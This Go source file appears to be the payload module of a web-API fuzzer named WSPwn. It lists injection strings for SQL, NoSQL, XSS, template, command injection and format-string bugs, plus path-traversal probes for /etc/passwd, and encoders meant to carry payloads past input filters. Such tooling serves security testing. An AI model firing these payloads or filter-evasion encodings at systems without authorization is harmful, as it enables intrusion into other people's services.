// Package payloads is WSPwn's injection vocabulary: families of attack strings
// grouped by the class of bug they probe for, plus the encoders that carry them
// past naive input filters. The fuzzer treats a family as a unit — it is what
// the brain scores and reorders — so adding a new class of test is a matter of
// adding a family here, nothing else.
package payloads

import (
	"encoding/base64"
	"fmt"
	"net/url"
	"strings"
)

// Family names a class of injection. These strings are the keys the brain
// learns weights for, so keep them stable.
const (
	SQLi      = "sqli"
	NoSQLi    = "nosqli"
	XSS       = "xss"
	Traversal = "traversal"
	CmdI      = "cmdi"
	SSTI      = "ssti"
	JSONType  = "jsontype"
	AuthZ     = "authz"
	Overflow  = "overflow"
	Format    = "format"
)

// base holds the raw payload strings for each family. %s, where present, is
// filled with a per-send unique marker so a reflected value is unmistakably
// ours and not a coincidence.
var base = map[string][]string{
	SQLi: {
		`' OR '1'='1`,
		`" OR "1"="1`,
		`' OR SLEEP(5)-- -`,
		`'; WAITFOR DELAY '0:0:5'-- -`,
		`1' AND '1'='2`,
		`%s' UNION SELECT %s-- -`,
	},
	NoSQLi: {
		`{"$ne":null}`,
		`{"$gt":""}`,
		`{"$where":"sleep(5000)"}`,
		`{"$regex":".*"}`,
	},
	XSS: {
		`<img src=x onerror=%s>`,
		`"><script>%s</script>`,
		`javascript:%s`,
		`'"><svg/onload=%s>`,
	},
	Traversal: {
		`../../../../etc/passwd`,
		`..\..\..\..\windows\win.ini`,
		`/etc/passwd%00`,
		`....//....//....//etc/passwd`,
		`file:///etc/passwd`,
	},
	CmdI: {
		`; id`,
		"| id",
		"$(id)",
		"`id`",
		`; sleep 5`,
		`& ping -c 3 127.0.0.1 &`,
	},
	SSTI: {
		`${7*7}`,
		`{{7*7}}`,
		`#{7*7}`,
		`<%= 7*7 %>`,
		`${{%s}}`,
		`{{%s.__class__}}`,
	},
	JSONType: {
		`__WSPWN_ARRAY__`,  // sentinel: replace scalar with an array
		`__WSPWN_OBJECT__`, // sentinel: replace scalar with an object
		`__WSPWN_NULL__`,   // sentinel: replace with null
		`__WSPWN_BIGNUM__`, // sentinel: replace with an oversized number
		`__WSPWN_NEG__`,    // sentinel: replace with -1
	},
	AuthZ: {
		`__WSPWN_IDINC__`,  // sentinel: numeric id + 1
		`__WSPWN_IDDEC__`,  // sentinel: numeric id - 1
		`__WSPWN_IDZERO__`, // sentinel: id -> 0
		`*`,
		`%s`,
	},
	Overflow: {
		strings.Repeat("A", 1024),
		strings.Repeat("A", 65536),
		strings.Repeat("%s", 2048),
	},
	Format: {
		`%n%n%n%n`,
		`%x%x%x%x`,
		`%s%s%s%s`,
		`{0}{1}{2}`,
	},
}

// Families returns the stable list of family names.
func Families() []string {
	return []string{SQLi, NoSQLi, XSS, Traversal, CmdI, SSTI, JSONType, AuthZ, Overflow, Format}
}

// Payload is one concrete, marker-stamped attack string ready to send.
type Payload struct {
	Family   string
	Encoder  string
	Marker   string
	Value    string
	Sentinel string // non-empty for structural payloads the fuzzer resolves itself
}

// For builds the payloads of one family, stamping each with the given marker.
// Structural sentinels (array/object/id math) are passed through in Sentinel
// for the fuzzer to apply, since they change a JSON value's type rather than
// its text.
func For(family, marker string) []Payload {
	var out []Payload
	for _, raw := range base[family] {
		if strings.HasPrefix(raw, "__WSPWN_") && strings.HasSuffix(raw, "__") {
			out = append(out, Payload{Family: family, Marker: marker, Sentinel: raw, Value: raw, Encoder: "none"})
			continue
		}
		v := raw
		if strings.Contains(raw, "%s") {
			v = strings.ReplaceAll(raw, "%s", marker)
		}
		out = append(out, Payload{Family: family, Marker: marker, Value: v, Encoder: "none"})
	}
	return out
}

// Encoders are the carriers the fuzzer can wrap a payload in to slip past a
// filter. Names are brain keys; keep them stable.
var Encoders = []string{"none", "url", "urlx2", "base64", "unicode", "jsonstr"}

// Encode applies a named encoder to a value.
func Encode(enc, v string) string {
	switch enc {
	case "url":
		return url.QueryEscape(v)
	case "urlx2":
		return url.QueryEscape(url.QueryEscape(v))
	case "base64":
		return base64.StdEncoding.EncodeToString([]byte(v))
	case "unicode":
		var b strings.Builder
		for _, r := range v {
			if r < 128 && (r == '<' || r == '>' || r == '"' || r == '\'' || r == '/' || r == '.') {
				b.WriteString(fmt.Sprintf(`\u%04x`, r))
			} else {
				b.WriteRune(r)
			}
		}
		return b.String()
	case "jsonstr":
		return strings.NewReplacer(`"`, `\"`, `\`, `\\`).Replace(v)
	default:
		return v
	}
}
